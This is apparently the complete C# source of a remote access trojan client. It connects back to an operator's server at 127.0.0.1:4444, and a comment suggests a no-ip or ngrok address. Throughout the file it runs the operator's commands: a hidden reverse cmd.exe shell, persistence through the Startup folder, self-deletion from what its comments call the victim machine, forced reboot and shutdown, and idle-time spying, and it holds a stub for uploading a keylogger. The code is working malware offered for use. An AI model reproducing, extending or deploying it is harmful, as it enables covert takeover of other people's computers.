using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Runtime.InteropServices;
using System.Windows.Forms;


namespace Client
{
    class Client
    {

        //Server IP address and port (Can use DNS names EG. no-ip or ngrok)
        static string host = "127.0.0.1";
        static int port = 4444;

        //Hex-Codes for changing volume
        private const int APPCOMMAND_VOLUME_MUTE = 0x80000;
        private const int APPCOMMAND_VOLUME_UP = 0xA0000;
        private const int APPCOMMAND_VOLUME_DOWN = 0x90000;
        private const int WM_APPCOMMAND = 0x319;

        static TcpClient client;
        static NetworkStream stream;
        static string ch;
        static byte[] buffer;
        static int data;
        static bool IsConnected = false;
        static bool IsInShell = false;
        static string output = "";
        static string error = "";

        static void Main(string[] args)
        {
            checkConnection();
        }

        static void checkConnection()
        {

            //Loops through and checks if the client and server are connected 
            while (IsConnected == false)
            {
                Thread.Sleep(500);
                Console.WriteLine("[Attempting to establish connection to server...]");

                //Catches any exceptions to allow the loop to continue until a connection has been established
                try
                {
                    client = new TcpClient(host, port);
                    stream = client.GetStream();
                    Console.WriteLine("[Connection Established] \n");
                    IsConnected = true;
                    RecvMessage();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Failed : " + e.Message);
                }
            }
        }

        static void RecvMessage()
        {
            try {
                //Checks if it is in shell and if so it sends the current directory to the server to display
                if (IsInShell == true)
                {
                    Console.WriteLine(" ");
                    string ch = Directory.GetCurrentDirectory();
                    byte[] message = Encoding.Unicode.GetBytes(ch);
                    stream.Write(message, 0, message.Length);
                }


                //Waits for a command to be sent to read
                buffer = new byte[client.ReceiveBufferSize];
                data = stream.Read(buffer, 0, client.ReceiveBufferSize);
                ch = Encoding.Unicode.GetString(buffer, 0, data);
            }
            catch (Exception)
            {
                IsConnected = false;
                checkConnection();
            }
            
            //Just returns the program to the beginning of the method as the 'clear' command is handled on the server
            if (ch.ToString() == "clear")
            {
                RecvMessage();
            }
            
            #region Holds All Non-Shell Commands
            //Will hold code for all of the out of shell commands
            if (IsInShell == false)
            {
                //Creates a presistant copy of the program to allow to run on reboot automatically
                if(ch.ToString() == "getPersistence")
                {
                    string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    string startupPath = @"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Client.exe";
                    passCommand(string.Format("copy \"{0}\" \"{1}\"", filePath, startupPath));
                    returnSuccsessfulCommand();
                }

                //Mutes system volume
                if(ch.ToString() == "muteVolume")
                {
                    Mute();
                }
                
                //Sets the system volume to a speciified amount
                if (ch.ToString().Contains("setVolume"))
                {
                    string localComm = ch.Remove(0, 9);
                    int amount = Int16.Parse(localComm) / 2;
                    for (int i = 0; i < 99; i++)
                    {
                        VolDown();
                    }
                    for(int i = 0; i < amount; i++)
                    {
                        VolUp();
                    }
                    
                }

                //Will upload my keylogger from a server to the local machine and start it
                if (ch.ToString() == "uploadKeylogger")
                {
                    //TODO: Implement
                }

                //Disconnects and deletes the client from the victim machine
                if(ch.ToString() == "WipeConnectionData")
                {
                    Process.Start("cmd.exe","/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath);
                    client.Close();
                    stream.Close();
                    Environment.Exit(0);
                }

                //Fully exits both the server and the client
                if (ch.ToString() == "KillConnection")
                {
                    client.Close();
                    stream.Close();
                    Environment.Exit(0);
                }

                //Gets time the user has been idleFor
                if(ch.ToString() == "getIdleTime")
                {
                    //Converts idle time into proper units
                    double idleTimeSeconds = (double)GetIdleTime() / 1000.00;

                    string chcmd = string.Format("The user has been absent for: {0} seconds", idleTimeSeconds);
                    byte[] messagecmd = Encoding.Unicode.GetBytes(chcmd);
                    stream.Write(messagecmd, 0, messagecmd.Length);
                    RecvMessage();
                }

                //Restarts the computer
                if(ch.ToString() == "reboot")
                {
                    passCommand("shutdown -r -f -t 0");
                    returnSuccsessfulCommand();
                }

                //Shuts down the computer
                if(ch.ToString() == "poweroff")
                {
                    passCommand("shutdown -s -f -t 0");
                    returnSuccsessfulCommand();
                }

                //Drops into command shell
                if (ch.ToString() == "shell")
                {
                    IsInShell = true;
                    RecvMessage();
                }
            }
            #endregion



            //Determines if the client is exiting the shell or the server is disconnecting
            if(ch.ToString() == "exit")
            {
                if (IsInShell == true)
                {
                    IsInShell = false;
                    RecvMessage();
                }
                else
                {
                    IsConnected = false;
                    client.Close();
                    stream.Close();
                    checkConnection();
                }
            }

            //Pass commands directly to cmd proccess to be run
            if (IsInShell == true)
            {
                if (!ch.ToLower().Contains("cd"))
                {
                    passCommand(ch);

                    if (error.Length > 0)
                    {
                        string chcmd = error.ToString();
                        byte[] messagecmd = Encoding.Unicode.GetBytes(chcmd);
                        stream.Write(messagecmd, 0, messagecmd.Length);
                        RecvMessage();
                    }
                    else if (output.Length > 0)
                    {
                        getOutput();
                    }
                    else if (output.Length <= 0)
                    {
                        returnSuccsessfulCommand();
                    }

                }

                //Changes the active directory
                if (ch.ToLower().Contains("cd"))
                {
                    if (ch.ToLower() == "cd ..")
                    {
                        if (Directory.GetCurrentDirectory().ToString() == Directory.GetDirectoryRoot(Directory.GetCurrentDirectory()).ToString())
                        {
                            RecvMessage();
                        }
                        Directory.SetCurrentDirectory(Directory.GetParent(Environment.CurrentDirectory).ToString());
                        RecvMessage();
                    }
                    else
                    {
                        ch = ch.Remove(0, 3);
                        if (Directory.Exists(ch))
                        {
                            Directory.SetCurrentDirectory(ch);
                            RecvMessage();
                        }

                    }
                }
            }

            //This informs the user the command entered was invalid
            if (IsInShell == false)
            {
                string invCommand = "Invalid Command";
                byte[] invMessage = Encoding.Unicode.GetBytes(invCommand);
                stream.Write(invMessage, 0, invMessage.Length);
                RecvMessage();
            }
            else
            {
                RecvMessage();
            }
        }

        //Returns the command output
        static void getOutput()
        {
            string chcmd = output.ToString();
            byte[] messagecmd = Encoding.Unicode.GetBytes(chcmd);
            stream.Write(messagecmd, 0, messagecmd.Length);
            RecvMessage();
        }


        //Passes command to be proccesed by cmd
        static void passCommand(string command)
        {
            Process process = new Process();
            ProcessStartInfo info = new ProcessStartInfo();
            info.UseShellExecute = false;
            info.RedirectStandardOutput = true;
            info.RedirectStandardError = true;
            info.FileName = "CMD.exe";
            info.Arguments = "/c" + command;
            info.CreateNoWindow = true;
            process.StartInfo = info;
            process.Start();
            output = process.StandardOutput.ReadToEnd();
            error = process.StandardError.ReadToEnd();
            Console.WriteLine(output);
            Console.WriteLine(error);
            process.WaitForExit();
        }

        //Returns a succsessful command exec to satisfy the awaiting response
        static void returnSuccsessfulCommand()
        {
            string chcmd = "Command Successfully Executed";
            byte[] messagecmd = Encoding.Unicode.GetBytes(chcmd);
            stream.Write(messagecmd, 0, messagecmd.Length);
            RecvMessage();
        }

        #region Get Idle Time
        [DllImport("User32.dll")]
        private static extern bool
         GetLastInputInfo(ref LASTINPUTINFO plii);

        public static uint GetIdleTime()
        {
            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
            lastInPut.cbSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(lastInPut);
            GetLastInputInfo(ref lastInPut);

            return ((uint)Environment.TickCount - lastInPut.dwTime);
        }

        #endregion

        #region Changing Volume
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg,
           IntPtr wParam, IntPtr lParam);

        static IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;
        static void Mute()
        {
            SendMessageW(handle, WM_APPCOMMAND, handle,
                (IntPtr)APPCOMMAND_VOLUME_MUTE);
        }

        static void VolDown()
        {
            SendMessageW(handle, WM_APPCOMMAND, handle,
                (IntPtr)APPCOMMAND_VOLUME_DOWN);
        }

        static void VolUp()
        {
            SendMessageW(handle, WM_APPCOMMAND, handle,
                (IntPtr)APPCOMMAND_VOLUME_UP);
        }
        #endregion
    }

    //Goes with getting the idle time
    internal struct LASTINPUTINFO
    {
        public uint cbSize;

        public uint dwTime;
    }

   
}
